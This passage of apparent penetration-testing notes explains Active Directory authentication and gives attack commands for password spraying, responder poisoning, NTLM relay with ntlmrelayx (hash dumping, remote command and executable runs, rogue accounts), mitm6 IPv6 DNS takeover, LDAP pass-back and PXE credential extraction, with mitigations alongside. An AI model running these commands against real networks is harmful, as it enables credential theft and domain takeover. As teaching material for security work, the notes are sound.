<p>Whenever a process wants to access an object into AD, it presents its <strong>Access Token</strong>. The access to this object is granted or not depending on its <strong>Security Descriptor</strong>.</p>
<p>An <strong>Access Control List (ACL)</strong> consists into a list of <strong>Access Control Entries (ACE)</strong>, each of which corresponds to individual permission or audits access. </p>
<h3 id="kerberos-authentication">Kerberos Authentication</h3>
<p><strong>Kerberos</strong> authentication is the default authentication protocol for any recent version of Windows. Users who log into a service using Kerberos will be assigned tickets.
Users with tickets can present them to a service to demonstrate they have already authenticated into the network before and are therefore enabled to use it.</p>
<p>The Kerberos authentication flow is the following:</p>
<ol>
<li>The user sends its username and a timestamp (encrypted with a symmetric key - derived from the user password) in a <code>Authentication Service Request (AS_REQ)</code>, to the <code>Authentication Server (AS)</code>, a component of the <code>Key Distribution Center (KDC)</code>, generally installed on the DC.</li>
<li>If the credentials and the timestamp are successfully verified by the <code>AS</code> by using the user password  (stored in the <code>AS</code>), it will return the followings in an  <code>Authentication Server Reply (AS_REP)</code>:<ul>
<li><code>Ticket Granting Ticket</code>: ticket that will be used by the user to request tickets to access specific services. It's encrypted with a key derived from  the <code>krbtgt</code> service account's password and therefore other users than <code>krbtgt</code> can't access its content.</li>
<li><code>Session Key</code>: It's a symmetric key encrypted with a key derived from the user password. It's also contained in the <code>TGT</code>.</li>
</ul>
</li>
<li>To access some service, the users contacts the <code>KDC</code>'s <code>Ticket Granting Service (TGS)</code> component, in charge of generating <code>Service Tickets (ST)</code>, tickets that are used to access the requested service. This is done with a <code>Ticket Granting Server Request (TGS-REQ)</code>, containing the followings:<ul>
<li>Username and timestamp encrypted with the session key.</li>
<li>The <code>TGT</code>.</li>
<li>The <code>Service Principal Name (SPN)</code> identifying the resource that the user is trying to access</li>
</ul>
</li>
<li>The <code>TGS</code> then will check if the requested resource exists in the realm, decrypt the <code>TGT</code> and extract the session key from it in order to decrypt and validate the username and the timestamp. If everything checks out, the <code>TGS</code> will respond with a <code>Ticket Granting Server Reply (TGS-REP)</code>, containing the followings:<ul>
<li><code>Service Ticket (ST)</code>: Ticket encrypted with a key derived from the <code>Service Owner Hash</code>, a service account used to authenticate against the requested service.</li>
<li><code>Service Session Key</code>: It's a symmetric key encrypted using the <code>Session Key</code>. It's also contained in the <code>ST</code>.</li>
</ul>
</li>
<li>The user sends the <code>ST</code> along with the username and a timestamp encrypted with the <code>Service Session Key</code> to the request service application server in <code>Application Request (AP-REQ)</code>.<ol>
<li>[Optional] - The application server passes the <code>Privilege Attribute Certificate (PAC)</code>, a Microsoft-specific authorization data present in the authorization data field of a ticket containing several logical components, including group membership data for authorization, alternate credentials for non-Kerberos authentication protocols, and policy control information for supporting interactive logon, to the <code>DC</code> in order to validate it (<code>KERB_VERIFY_PAC</code>).</li>
<li>[Optional] - After verifying the <code>PAC</code>, the <code>DC</code> returns a RPC status code depending on the outcome of the validation.</li>
</ol>
</li>
<li>The application server decrypts the <code>ST</code> with its secret key (that is derived from the <code>Service Owner Hash</code>) and obtains the <code>Service Session Key</code> that uses to decrypt and validate the encrypted username and timestamp. If everything checks out, the user is granted to access the service with an <code>Application Server Reply (AP-REP)</code>.</li>
</ol>
<p><strong>Kerberos Authentication Flow</strong></p>
<p><img alt="kerberos-auth-flow.png" src="https://ojack69.github.io/jacks-corner/images/ad/active-directory/kerberos-auth-flow.png"/></p>
<p>Flow Summary:</p>
<ol>
<li>User -&gt; AS-REQ -&gt; AS</li>
<li>AS -&gt; AS-REP (TGT + Session Key) -&gt; User</li>
<li>User -&gt; TGS-REQ (TGT + SPN) -&gt; TGS</li>
<li>TGS -&gt; TGS-REP (ST + Service Session Key) -&gt; User</li>
<li>User -&gt; AS-REQ (ST) -&gt; Service</li>
<li>Service -&gt; AS-REP -&gt; User</li>
</ol>
<p>Key derived from user's account password in step <em>AS_REQ</em> is generated with one of the following algorithms:</p>
<ul>
<li>DES (default)</li>
<li>RC4 (when using RC4, the key will be equal to the NTLM hash of the account's password)</li>
<li>AES128</li>
<li>AES256</li>
</ul>
<p><strong>Note1</strong>: The KDC is composed by the AS and the TGS.
<strong>Note2</strong>: The <strong>ST</strong> is more commonly referred as <strong>TGS</strong>.</p>
<p><strong>PAC Validation flow</strong></p>
<p><img alt="kerberos-pac-validation.png" src="https://ojack69.github.io/jacks-corner/images/ad/active-directory/kerberos-pac-validation.png"/></p>
<p>PAC validation is generally disabled by default.</p>
<h4 id="service-principal-name-spn">Service Principal Name (SPN)</h4>
<p>An SPN is a unique identifier for a service on a network that uses Kerberos authentication. It consists of a service class, a host name, and sometimes a port. It's possible to register an SPN as follows:</p>
<div class="highlight"><pre><span></span><code><span class="n">Setspn</span> <span class="n">-s</span> <span class="p">&lt;</span><span class="n">service-class</span><span class="p">&gt;/&lt;</span><span class="n">computer-name</span><span class="p">&gt;.&lt;</span><span class="n">domain-name</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">domain-user-account</span><span class="p">&gt;</span>
</code></pre></div>
<p>On a network that uses Kerberos authentication, a SPN for the server must be registered under either a built-in computer account (such as <em>NetworkService</em> or <em>LocalSystem</em>) or user account. SPNs are registered for built-in accounts automatically whilst are to be manually registered for domain user accounts.</p>
<h3 id="netntlm-authentication_1">NetNTLM Authentication</h3>
<h4 id="lm-vs-ntlm-vs-net-ntlmv1-vs-net-ntlmv2">LM vs NTLM vs Net-NTLMv1 vs Net-NTLMv2</h4>
<p><strong>LM-hashes</strong> is the oldest password storage used by Windows, obtainable, if still available, from the SAM database on a Windows system, or the NTDS database on the Domain Controller. LM was turned off by default starting in Windows Vista/Server 2008.</p>
<p>The algorithm is the following:</p>
<div class="highlight"><pre><span></span><code><span class="mf">1.</span><span class="w"> </span><span class="n">Convert</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="n">lower</span><span class="w"> </span><span class="n">case</span><span class="w"> </span><span class="kr">to</span><span class="w"> </span><span class="n">upper</span><span class="w"> </span><span class="n">case</span><span class="w">  </span>
<span class="mf">2.</span><span class="w"> </span><span class="n">Pad</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="kr">to</span><span class="w"> </span><span class="mf">14</span><span class="w"> </span><span class="n">characters</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">NULL</span><span class="w"> </span><span class="n">characters</span><span class="w">  </span>
<span class="mf">3.</span><span class="w"> </span><span class="n">Split</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="kr">to</span><span class="w"> </span><span class="n">two</span><span class="w"> </span><span class="mf">7</span><span class="w"> </span><span class="n">character</span><span class="w"> </span><span class="n">chunks</span><span class="w">  </span>
<span class="mf">4.</span><span class="w"> </span><span class="n">Create</span><span class="w"> </span><span class="n">two</span><span class="w"> </span><span class="n">DES</span><span class="w"> </span><span class="n">keys</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">each</span><span class="w"> </span><span class="mf">7</span><span class="w"> </span><span class="n">character</span><span class="w"> </span><span class="n">chunk</span><span class="w">  </span>
<span class="mf">5.</span><span class="w"> </span><span class="n">DES</span><span class="w"> </span><span class="n">encrypt</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="s">"KGS!@#$%"</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">these</span><span class="w"> </span><span class="n">two</span><span class="w"> </span><span class="n">chunks</span><span class="w">  </span>
<span class="mf">6.</span><span class="w"> </span><span class="n">Concatenate</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">two</span><span class="w"> </span><span class="n">DES</span><span class="w"> </span><span class="n">encrypted</span><span class="w"> </span><span class="n">strings</span><span class="mf">.</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">LM</span><span class="w"> </span><span class="n">hash</span><span class="mf">.</span>
</code></pre></div>
<p><strong>NTLM (or NTHash)</strong> is used to store password hashs in modern Windows systems. It's obtainable by dumping the <em>SAM database</em> or the <em>NTDS</em> from a DC, using <code>Mimikatz</code>, etc.</p>
<p>The algorithm is the following:</p>
<div class="highlight"><pre><span></span><code>MD4(UTF-16-LE(password))
</code></pre></div>
<p><strong>NetNTLMv1</strong> is an authentication protocol that uses <em>NTLM</em> and <em>LM</em> in a challenge/response between the server and the client. Can be captured with the <code>responder</code> tool.</p>
<p><strong>NetNTLMv2</strong> is an improved version of the previous protocol. Can be captured with the <code>responder</code> tool.</p>
<p><strong>Note</strong>: NetNTLM is often referred to as "<em>Windows Authentication</em>".</p>
<h4 id="authentication-flow">Authentication Flow</h4>
<p>Following the authentication flow for the <strong>NetNTLMv2</strong>:</p>
<ol>
<li>The client sends an authentication request to the server they want to access.</li>
<li>The server generates a random number and sends it as a challenge to the client.</li>
<li>The client combines their NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.</li>
<li>The server forwards the challenge and the response to the Domain Controller for verification.</li>
<li>The domain controller uses the challenge to recalculate the response and compares it to the original response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.</li>
<li>The server forwards the authentication result to the client.</li>
</ol>
<p><img alt="NTLM-authentication-flow.png" src="https://ojack69.github.io/jacks-corner/images/ad/active-directory/NTLM-authentication-flow.png"/></p>
<p>The user's password (or hash) is never transmitted through the network for security.</p>
<p><strong>Note:</strong> The described process applies when using a <strong>domain account</strong>. If a local account is used, the server can verify the response to the challenge itself without requiring interaction with the domain controller since it has the password hash stored locally on its SAM.</p>
<h3 id="lsass-process_1">LSASS Process</h3>
<p><strong>Local Security Authority Server Service (LSASS)</strong> is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources,&nbsp;such as file shares, SharePoint sites, and other network services,&nbsp;without entering credentials every time a user connects.</p>
<h2 id="initial-attack-vectors_1">Initial Attack Vectors</h2>
<h3 id="password-spraying">Password Spraying</h3>
<p>If there are any exposed services using NetNTLM authentication, a list of possible usernames is available (ex: through OSINT) and a known password is available (ex: default password for new users), it's worth trying a <strong>Password Spray</strong> attack. </p>
<p>This is a particular type of brute-force attack where, given a known password, it is used to perform login by testing various usernames/emails. </p>
<p>Password spraying remotely with <code>netexec</code>:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;users<span class="w"> </span>list&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password<span class="p">|</span>password<span class="w"> </span>list&gt;<span class="w"> </span>--no-bruteforce
</code></pre></div>
<p>Password spraying with <a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a>:</p>
<div class="highlight"><pre><span></span><code><span class="c"># On the whole domain</span>
<span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-Password</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span>

<span class="c"># Generate a list of users not disabled and not potentially lockable</span>
<span class="nb">Get-DomainUserList</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;</span> <span class="n">-RemoveDisabled</span> <span class="n">-RemovePotentialLockouts</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="n">-Encoding</span> <span class="n">ascii</span> <span class="n">userlist</span><span class="p">.</span><span class="n">txt</span>
<span class="c"># On users subset</span>
<span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-UserList</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Domain</span> <span class="n">domain-name</span>  <span class="n">-PasswordList</span> <span class="n">passlist</span><span class="p">.</span><span class="n">txt</span> <span class="n">-OutFile</span> <span class="n">sprayed-creds</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>
<p>Password Spraying with <a href="https://github.com/ojack69/jacks-corner/blob/main/scripts/PowerShell/PasswordSprayer.ps1">PasswordSprayer</a>:</p>
<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">PasswordSprayer</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Password</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span>

<span class="c"># Use username as password</span>
<span class="p">.\</span><span class="n">PasswordSprayer</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-UsernameAsPassword</span>
</code></pre></div>
<p>Rubeus password spraying:</p>
<div class="highlight"><pre><span></span><code>Rubeus.exe brute /password:Password1 /noticket
</code></pre></div>
<h3 id="llmnrnbt-ns-poisoning">LLMNR/NBT-NS Poisoning</h3>
<p><strong>Link Local Multicast Name Resolution (LLMNR)</strong>, previously known as Netbios Nameservice (N BT-NS) is a protocol based on the Domain Name System (DNS) packet format that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local link. 
<strong>It is used to resolve local name when the DNS fails</strong>.</p>
<p>This service utilizes the user's username and NTLMv2 hash when appropriately responded; moreover it's unauthenticated and clear-text transmitted over UDP.  For these reasons it's easily spoofable and can be abused to obtain users password hashes that could be lately cracked.</p>
<p>It's possible to use the <code>responder</code> tool, an LLMNR, NBT-NS and MDNS poisoner.
It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool will only answer to File Server Service request, which is for SMB.</p>
<p>Setup various services listeners an respond with spoofed responses in order to perform poisoning:</p>
<div class="highlight"><pre><span></span><code>responder<span class="w"> </span>-I<span class="w"> </span>&lt;interface&gt;<span class="w"> </span>-dw<span class="w"> </span>
</code></pre></div>
<h4 id="mitigations">Mitigations</h4>
<ul>
<li>Disable LLMNR/NBT-NS</li>
<li>If it's not possible to disable it:<ul>
<li>Require Network Access Control</li>
<li>Require strong user password policy ( lenght &gt;14 and limited common word usage)</li>
</ul>
</li>
</ul>
<h3 id="relay-attacks_1">Relay Attacks</h3>
<div class="highlight"><pre><span></span><code># Source: https://www.thehacker.recipes/ad/movement/ntlm/relay

The LM and NTLM authentication protocols are "application protocol-independent". It means one can relay LM or NTLM authentication messages over a certain protocol, say HTTP, over another, say SMB. That is called cross-protocols LM/NTLM relay.
</code></pre></div>
<p>Cross-protocol relays are resumed in the following image (<a href="https://beta.hackndo.com/ntlm-relay/">source</a>):</p>
<p><img alt="ad-cross-protocol-relays.png" src="https://ojack69.github.io/jacks-corner/images/ad/active-directory/ad-cross-protocol-relays.png"/></p>
<h4 id="smb-relay">SMB Relay</h4>
<p>Instead of cracking hashes gathered with <code>responder</code>,  those hashes are relayed to specific machines and potentially gain access.</p>
<p>Requirements for the attack to be applicable:</p>
<ul>
<li><strong>SMB signing</strong> must be disabled on the target; SMB signing is a security mechanism in the SMB protocol. SMB signing means that every SMB message contains a signature that is generated by using the session key. The client puts a hash of the entire message into the signature field of the SMB header.</li>
<li><strong>Relayed credentials must belong to an admin</strong> on the machine with SMB signing disabled.</li>
<li>It's not possible to use relayed credentials to target services on the same machine the credentials come from!</li>
</ul>
<p>1 - Maps the network of live hosts and saves a list of only the hosts that don't require SMB signing:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>network/ip&gt;<span class="w"> </span>--gen-relay-list<span class="w"> </span>relay_list.txt
<span class="c1"># OR</span>
nmap<span class="w"> </span>--script<span class="o">=</span>smb2-security-mode.nse<span class="w"> </span>-p445<span class="w"> </span>&lt;target<span class="w"> </span>network/ip&gt;
</code></pre></div>
<p>2 - Disable listening for SMB and HTTP protocols in the <code>responder</code>  by modifying <code>responder</code> config file, setting the protocols entries to <code>Off</code>:</p>
<div class="highlight"><pre><span></span><code>vim<span class="w"> </span>/usr/share/responder/Responder.conf
responder<span class="w"> </span>-I<span class="w"> </span>&lt;interface&gt;<span class="w"> </span>-dw<span class="w"> </span>
</code></pre></div>
<p>3 - Use <code>impacket</code>'s ntlmrelayx.py script:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Dumps local SAM hashes</span>
ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>relay_list.txt<span class="w"> </span>-smb2support

<span class="c1"># Run with interactive mode (then connect with netcat to listening port)</span>
ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>relay_list.txt<span class="w"> </span>-smb2support<span class="w"> </span>-i

<span class="c1"># Run commands</span>
ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-c<span class="w"> </span><span class="s2">"whoami"</span>

<span class="c1"># Run executable</span>
ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-e<span class="w"> </span>evil.exe

<span class="c1"># Start SOCKS proxy*</span>
ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-socks<span class="w"> </span>--keep-relaying
</code></pre></div>
<p>*<strong>Note</strong>: in multi-relay mode (<code>-tf</code>), <strong>when relaying fails against a target, no further targets will be processed until the relay receives new connection</strong>. Use the <code>--keep-relaying</code> to prevent this (see <a href="https://github.com/fortra/impacket/pull/1741">there</a>).</p>
<p><strong>Note</strong>: Any recovered hashed credentials with <code>responder</code> are printed to STD OUT and also saved to a John the Ripper compliant file, located at <code>/usr/share/responder/logs/</code></p>
<ul>
<li>The files are named in the following format - (Module-Name)-(HASH-TYPE)-(Client-IP).txt</li>
</ul>
<h4 id="drop-the-mic">Drop-the-mic</h4>
<p><strong>CVE-2019-1019</strong>, <strong>CVE-2019-1040</strong> and <strong>CVE-2019-1166</strong> are critical vulnerabilities in Microsoft's NTLM authentication, allowing attackers to bypass NTLM relay attack mitigations. These flaws enable credential forwarding by stripping MIC protections, making systems susceptible to privilege escalation and unauthorized access.</p>
<ul>
<li>Generally, it's not possible to relay SMB hashes to LDAP or SMB to SMB with required signing.</li>
<li>By abusing these CVE, it's possible to bypass this limitation.</li>
<li><strong>When the target supports NTLMv1 it's possible to bypass MIC checking since this version of NTLM does not support it.</strong></li>
</ul>
<p>If the target server is vulnerable to <strong>CVE-2019-1040</strong> or supports NTLMv1 authentication, bypass MIC restriction with Impacket <code>ntlmrelayx</code>'s option <code>-remove-mic</code>.</p>
<p>If the target server is vulnerable to <strong>CVE-2019-1019</strong>, bypass MIC restriction with Impacket <code>ntlmrelayx</code>'s options <code>-remove-target</code> and <code>-machine-account</code></p>
<p>Vulnerable versions:</p>
<ul>
<li><strong>Windows Server 2008 R2</strong></li>
<li><strong>Windows Server 2012</strong></li>
<li><strong>Windows Server 2012 R2</strong></li>
<li><strong>Windows Server 2016</strong></li>
<li><strong>Windows Server 2019</strong> (before June 2019 patches)</li>
</ul>
<h4 id="mitigations_1">Mitigations</h4>
<ul>
<li><strong>SMB and LDAP Session Signing</strong> <ul>
<li>Ensures message integrity by cryptographically signing SMB (Server Message Block) and LDAP (Lightweight Directory Access Protocol) communications.</li>
<li>Prevents attackers from modifying messages in transit.</li>
<li>Requires both client and server to support and enforce signing.</li>
</ul>
</li>
<li><strong>Extended Protection for Authentication (EPA)</strong><ul>
<li>Introduces <strong>Channel Binding Tokens (CBT)</strong>, which bind authentication requests to a specific TLS session.</li>
<li>Prevents credential forwarding by ensuring authentication messages cannot be used outside their intended session.</li>
<li>Commonly used in LDAP over SSL/TLS and HTTP-based authentication.</li>
</ul>
</li>
<li><strong>Message Integrity Code (MIC)</strong><ul>
<li>A cryptographic checksum included in NTLM authentication exchanges.</li>
<li>Prevents attackers from modifying authentication messages to perform a relay attack.</li>
<li>Requires NTLM session security to be enabled.</li>
</ul>
</li>
</ul>
<p>Suggested mitigation to apply:</p>
<ul>
<li>Enable SMB Signing on all devices:<ul>
<li><strong>Pro</strong>: Completely stops the attack</li>
<li><strong>Co</strong>n: Can cause performance issues with file copies</li>
</ul>
</li>
<li>Disable NTLM authentication on network<ul>
<li><strong>Pro</strong>: Completely stops the attack</li>
<li><strong>Con</strong>: If Kerberos stops working, Windows defaults back to NTLM</li>
</ul>
</li>
<li>Account tiering:<ul>
<li><strong>Pro</strong>: Limits domain admins to specific tasks (e.g. only log onto servers with need for DA)</li>
<li><strong>Con</strong>: Enforcing the policy may be difficult</li>
</ul>
</li>
<li>Local admin restriction:<ul>
<li><strong>Pro</strong>: Can prevent a lot of lateral movement</li>
<li><strong>Con</strong>: Potential increase in the amount of service desk tickets</li>
</ul>
</li>
</ul>
<h3 id="dns-takeover-via-ipv6_1">DNS takeover via IPv6</h3>
<p>Usually IPv6 is enabled but no DNS service is generally configured to respond to IPv6. IPv6 attacks abuses the default IPv6 configuration in Windows networks to spoof DNS replies by acting as a malicious DNS server and redirect traffic to an attacker specified endpoint.
IPv6 is enabled and preferred over IPv4 from Windows Vista and on.</p>
<p>By spoofing DNS, credentials get sent to the fake DNS server which will relay them to the target; when targeting a DC, it's possible to abuse this mechanism to obtain all the information stored int the DC and create evil accounts/policies to gain access to it or even new domain machines. This is possible when the relayed credentials belongs to an administrator.
In order to work, SMB (without signing - SMB Relay attack), LDAPS or any service to which relay the credentials should be enabled on the DC.</p>
<p>Start <code>mitm6</code> to respond with spoofed IPv6 DNS responses:</p>
<div class="highlight"><pre><span></span><code>mitm6<span class="w"> </span>-d<span class="w"> </span>&lt;target<span class="w"> </span>domain&gt;
</code></pre></div>
<p>Then relay captured hashes with <code>ntlmrelayx.py</code> (should wait 'till some DNS events happen):</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Perform a SMB relay attack</span>
ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-wh<span class="w"> </span>&lt;attacker<span class="w"> </span>wpad<span class="w"> </span>spoofed<span class="w"> </span>domain&gt;<span class="w"> </span>-t<span class="w"> </span>smb://&lt;target&gt;<span class="w"> </span>-smb2support<span class="w"> </span>

<span class="c1"># Abuse WPAD to dump useful information and create a new persisten account on the DC (an administrator should perform a login while listening)</span>

<span class="c1">## Using SMB (if enabled on the DC)</span>
ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-t<span class="w"> </span>&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>-wh<span class="w"> </span>&lt;attacker<span class="w"> </span>wpad<span class="w"> </span>spoofed<span class="w"> </span>domain&gt;<span class="w"> </span>-l<span class="w"> </span>lootdump<span class="w"> </span>-smb2support

<span class="c1">## Using LDAP (if enabled on the DC)</span>
ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-t<span class="w"> </span>ldap://&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>-wh<span class="w"> </span>&lt;attacker<span class="w"> </span>wpad<span class="w"> </span>spoofed<span class="w"> </span>domain&gt;<span class="w"> </span>-l<span class="w"> </span>lootdump

<span class="c1"># Add computer with delegation capabilities to relayed computer for Resource-based Constrained Delegation:</span>
ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-wh<span class="w"> </span>&lt;attacker<span class="w"> </span>wpad<span class="w"> </span>spoofed<span class="w"> </span>domain&gt;<span class="w"> </span>-t<span class="w"> </span>ldap://&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>-l<span class="w"> </span>lootdump<span class="w"> </span>--add-computer<span class="w"> </span>&lt;new<span class="w"> </span>computer<span class="w"> </span>name&gt;<span class="w"> </span>--delegate-access
</code></pre></div>
<p>Interesting resources:</p>
<ul>
<li><a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation">NTLM Relaying and Kerberos Delegation</a></li>
<li><a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">mimtm6 - Compromising ipv4 network via ipv6</a></li>
<li><a href="https://github.com/zulfi0/android_snag_creds">Capture windows NTLMv2 hashes using an android device</a></li>
</ul>
<h4 id="mitigations_2">Mitigations</h4>
<ul>
<li>IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments. If IPv6 isn't used internally, the safest way to prevent <code>mitm6</code> is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. <ul>
<li>Disabling IPv6 entirely may have unwanted side effects. </li>
<li>Setting the following predefined rules to <em>Block</em> instead of <em>Allow</em> prevents the attack from working:
    a. (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In)
    b. (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
    c. (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-Out)</li>
</ul>
</li>
<li>If WPAD is not in use internally, disable it via Group Policy and by disabling the <strong>WinHttpAutoProxySvc service</strong>.</li>
<li>Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.</li>
<li>Consider <em>Administrative</em> users to the <em>Protected Users</em> group or marking them as <em>Account</em> is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.</li>
</ul>
<h3 id="ldap-pass-back_1">LDAP Pass-back</h3>
<p>Another method of AD authentication that applications can use is <strong>Lightweight Directory Access Protocol (LDAP)</strong> authentication. With this type of authentication, the application directly verifies the user's credentials by querying the LDAP. To do so, it necessarily has to hold its pair of AD credentials in order to authenticate itself to the LDAP.</p>
<p>LDAP authentication is often used with third-party (non-Microsoft) applications that integrate with AD, such as:</p>
<ul>
<li>Gitlab</li>
<li>Jenkins</li>
<li>Custom-developed web applications</li>
<li>Printers</li>
<li>VPNs</li>
</ul>
<p>One of the main attackers aim is to obtain those service AD credentials. </p>
<p><strong>LDAP Pass-back</strong> is a common attack against network devices, such as printers. This attack is possible when the attacker has the possibility to update the application's LDAP connection configuration (ex: through a vulnerable or unprotected printer web interface).
The LDAP Pass-back consists into forcing the target application to attempt an LDAP authentication to an attacker-controlled IP in order to leak the LDAP credentials by altering the configuration settings.</p>
<p>The smartest way to intercept those credentials is to host a rogue LDAP server since, generally, the targeted application will try to negotiate the LDAP authentication method details, selecting the most secure authentication method that both the target and the LDAP server support. </p>
<p>If the authentication method is too secure, the credentials will not be transmitted in cleartext: for this reason, the rogue LDAP server has to downgrade the authentication method, forcing the credentials to be sent in cleartext.</p>
<p>This <a href="https://github.com/pedrojosenavasperez/ldap-passback-docker">LDAP server container</a> is configured to support plaintext authentication, easing to perform a LDAP Pass-back attack.</p>
<h3 id="pxe-boot-image-retrieval">PXE Boot Image Retrieval</h3>
<p><strong>Microsoft Deployment Toolkit (MDT)</strong> is a Microsoft service that assists with automating the deployment of Microsoft Operating Systems (OS) to the organization machines. Essentially it allows the IT team to pre-configure and manage boot images.</p>
<p>The <strong>System Center Configuration Manager (SCCM)</strong> can be seen as almost an expansion of the MDT. It allows the IT team to review available updates to all software installed across the organization. The team can also test these patches in a sandbox environment to ensure they are stable before centrally deploying them to all domain-joined machines.</p>
<p><strong>Preboot Execution Environment (PXE)</strong> boot enables a computer to load an OS over a network connection. MDT can be used to create, manage, and host PXE boot images. 
PXE boot is usually integrated with DHCP, which means that if DHCP assigns an IP, the host is allowed to request the PXE boot image and start the network OS installation process.</p>
<p>Following the flow of the PXE boot:</p>
<p><img alt="PXE-boot-flow.png" src="https://ojack69.github.io/jacks-corner/images/ad/active-directory/PXE-boot-flow.png"/>Once the process is performed, the client will use a <strong>TFTP connection</strong> to download the PXE boot image. We can exploit the PXE boot image for two different purposes:</p>
<ul>
<li>Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.</li>
<li>Perform password scraping attacks to recover AD credentials used during the install. </li>
</ul>
<p>At step <em>6</em> the user receives the names of the BCD files. These files store the information relevant to PXE Boots for the different types of architecture.</p>
<p>They also contain the <strong>PXE Boot Image Location</strong> consisting into the path of the <strong>WIM File</strong>, a bootable image in the <strong>Windows Images Format (WIM)</strong>. This is obtainable from the BCD file using the <code>PowerPXE</code> powershell script.</p>
<p>It's then possible to retrieve these BCD file with a TFTP client (step <em>7-8</em>). <strong>The BCD files are always located in the /Tmp/ directory on the MDT server</strong>.</p>
<p>0 - Request an IP to the DHCP, retrieve BCD file path, retrieve WIM File path and extract  credentials with <code>PowerPXE</code>:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerPXE</span><span class="p">.</span><span class="n">ps1</span>
<span class="nb">Get-PXEcreds</span> <span class="n">-InterfaceAlias</span> <span class="p">&lt;</span><span class="n">interface</span><span class="p">&gt;</span>
</code></pre></div>
<p>Or manually (requires the BCD file path to be known):</p>
<p>1 - Retrieve BCD file with the TFTP client:</p>
<div class="highlight"><pre><span></span><code>tftp<span class="w"> </span>-i<span class="w"> </span>&lt;MDT<span class="w"> </span>Server<span class="w"> </span>IP&gt;<span class="w"> </span>GET<span class="w"> </span><span class="s2">"\Tmp\&lt;bcd file&gt;.bcd"</span><span class="w"> </span>conf.bcd
</code></pre></div>
<p>2 - Use <code>PowerPXE</code> to extract the WIM File path (the <strong>PXE Boot Image Location</strong>):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerPXE</span><span class="p">.</span><span class="n">ps1</span>
<span class="nv">$BCDFile</span> <span class="p">=</span> <span class="s2">"conf.bcd"</span>
<span class="nb">Get-WimFile</span> <span class="n">-bcdFile</span> <span class="nv">$BCDFile</span>
<span class="p">...</span>
<span class="p">&gt;&gt;</span> <span class="n">Parse</span> <span class="n">the</span> <span class="n">BCD</span> <span class="n">file</span><span class="p">:</span> <span class="n">conf</span><span class="p">.</span><span class="n">bcd</span>
<span class="p">&gt;&gt;&gt;&gt;</span> <span class="n">Identify</span> <span class="n">wim</span> <span class="n">file</span> <span class="p">:</span> <span class="p">&lt;</span><span class="n">PXE</span> <span class="n">Boot</span> <span class="n">Image</span> <span class="n">Location</span><span class="p">&gt;</span>
